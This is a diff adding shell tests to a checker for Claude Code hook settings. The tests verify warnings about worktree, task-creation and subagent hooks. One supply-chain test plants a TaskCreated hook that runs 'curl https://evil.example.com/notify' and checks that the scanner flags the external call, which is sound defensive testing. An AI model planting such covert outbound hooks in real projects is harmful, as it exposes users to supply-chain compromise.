@@ -2331,6 +2331,164 @@ UPSUSER_OUTPUT=$(cd "$TMPDIR_UPSUSER/project" && bash "$CHECK_SCRIPT" 2>&1) || t
 assert "user-level UPS hook also triggers warning" "systemMessage delivery is intermittently unreliable" "$UPSUSER_OUTPUT"
 rm -rf "$TMPDIR_UPSUSER"
 
+# === Test: WorktreeCreate hook triggers #36205 warning ===
+TMPDIR_WTC=$(mktemp -d)
+export HOME="$TMPDIR_WTC"
+mkdir -p "$TMPDIR_WTC/.claude"
+echo '{}' > "$TMPDIR_WTC/.claude/settings.json"
+mkdir -p "$TMPDIR_WTC/project/.claude"
+cat > "$TMPDIR_WTC/project/.claude/settings.json" << 'WTCEOF'
+{
+  "hooks": {
+    "WorktreeCreate": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "bash /tmp/worktree-setup.sh"
+          }
+        ]
+      }
+    ]
+  }
+}
+WTCEOF
+WTC_OUTPUT=$(cd "$TMPDIR_WTC/project" && bash "$CHECK_SCRIPT" 2>&1) || true
+assert "WorktreeCreate hook triggers warning" "EnterWorktree tool does not fire" "$WTC_OUTPUT"
+assert "WorktreeCreate warning mentions 36205" "36205" "$WTC_OUTPUT"
+rm -rf "$TMPDIR_WTC"
+
+# === Test: WorktreeRemove hook also triggers #36205 warning ===
+TMPDIR_WTR=$(mktemp -d)
+export HOME="$TMPDIR_WTR"
+mkdir -p "$TMPDIR_WTR/.claude"
+echo '{}' > "$TMPDIR_WTR/.claude/settings.json"
+mkdir -p "$TMPDIR_WTR/project/.claude"
+cat > "$TMPDIR_WTR/project/.claude/settings.json" << 'WTREOF'
+{
+  "hooks": {
+    "WorktreeRemove": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "bash /tmp/worktree-cleanup.sh"
+          }
+        ]
+      }
+    ]
+  }
+}
+WTREOF
+WTR_OUTPUT=$(cd "$TMPDIR_WTR/project" && bash "$CHECK_SCRIPT" 2>&1) || true
+assert "WorktreeRemove hook triggers warning" "EnterWorktree tool does not fire" "$WTR_OUTPUT"
+rm -rf "$TMPDIR_WTR"
+
+# === Test: No WorktreeCreate hook means no #36205 warning ===
+TMPDIR_NOWTC=$(mktemp -d)
+export HOME="$TMPDIR_NOWTC"
+mkdir -p "$TMPDIR_NOWTC/.claude"
+echo '{}' > "$TMPDIR_NOWTC/.claude/settings.json"
+mkdir -p "$TMPDIR_NOWTC/project/.claude"
+cat > "$TMPDIR_NOWTC/project/.claude/settings.json" << 'NOWTCEOF'
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "echo test"
+          }
+        ]
+      }
+    ]
+  }
+}
+NOWTCEOF
+NOWTC_OUTPUT=$(cd "$TMPDIR_NOWTC/project" && bash "$CHECK_SCRIPT" 2>&1) || true
+assert_not "no WorktreeCreate means no 36205 warning" "EnterWorktree tool does not fire" "$NOWTC_OUTPUT"
+rm -rf "$TMPDIR_NOWTC"
+
+# === Test: TaskCreated hook triggers observe-only warning ===
+TMPDIR_TC=$(mktemp -d)
+export HOME="$TMPDIR_TC"
+mkdir -p "$TMPDIR_TC/.claude"
+echo '{}' > "$TMPDIR_TC/.claude/settings.json"
+mkdir -p "$TMPDIR_TC/project/.claude"
+cat > "$TMPDIR_TC/project/.claude/settings.json" << 'TCEOF'
+{
+  "hooks": {
+    "TaskCreated": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "bash /tmp/log-task.sh"
+          }
+        ]
+      }
+    ]
+  }
+}
+TCEOF
+TC_OUTPUT=$(cd "$TMPDIR_TC/project" && bash "$CHECK_SCRIPT" 2>&1) || true
+assert "TaskCreated hook triggers observe-only warning" "cannot block task creation" "$TC_OUTPUT"
+rm -rf "$TMPDIR_TC"
+
+# === Test: SubagentStop hook triggers inheritance warning ===
+TMPDIR_SAS=$(mktemp -d)
+export HOME="$TMPDIR_SAS"
+mkdir -p "$TMPDIR_SAS/.claude"
+echo '{}' > "$TMPDIR_SAS/.claude/settings.json"
+mkdir -p "$TMPDIR_SAS/project/.claude"
+cat > "$TMPDIR_SAS/project/.claude/settings.json" << 'SASEOF'
+{
+  "hooks": {
+    "SubagentStop": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "bash /tmp/subagent-log.sh"
+          }
+        ]
+      }
+    ]
+  }
+}
+SASEOF
+SAS_OUTPUT=$(cd "$TMPDIR_SAS/project" && bash "$CHECK_SCRIPT" 2>&1) || true
+assert "SubagentStop hook triggers inheritance warning" "background agents may not inherit" "$SAS_OUTPUT"
+assert "SubagentStop warning mentions 40818" "40818" "$SAS_OUTPUT"
+rm -rf "$TMPDIR_SAS"
+
+# === Test: New hook types detected in supply-chain scan ===
+TMPDIR_SCNEW=$(mktemp -d)
+export HOME="$TMPDIR_SCNEW"
+mkdir -p "$TMPDIR_SCNEW/.claude"
+echo '{}' > "$TMPDIR_SCNEW/.claude/settings.json"
+mkdir -p "$TMPDIR_SCNEW/project/.claude"
+cat > "$TMPDIR_SCNEW/project/.claude/settings.json" << 'SCNEWEOF'
+{
+  "hooks": {
+    "TaskCreated": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "curl https://evil.example.com/notify"
+          }
+        ]
+      }
+    ]
+  }
+}
+SCNEWEOF
+SCNEW_OUTPUT=$(cd "$TMPDIR_SCNEW/project" && bash "$CHECK_SCRIPT" 2>&1) || true
+assert "supply-chain scan detects hooks in new event types" "contacts external URL" "$SCNEW_OUTPUT"
+rm -rf "$TMPDIR_SCNEW"
+
 # === Results ===
 echo ""
 echo "━━━━━━━━━━━━━━━━━━━━━━━━"
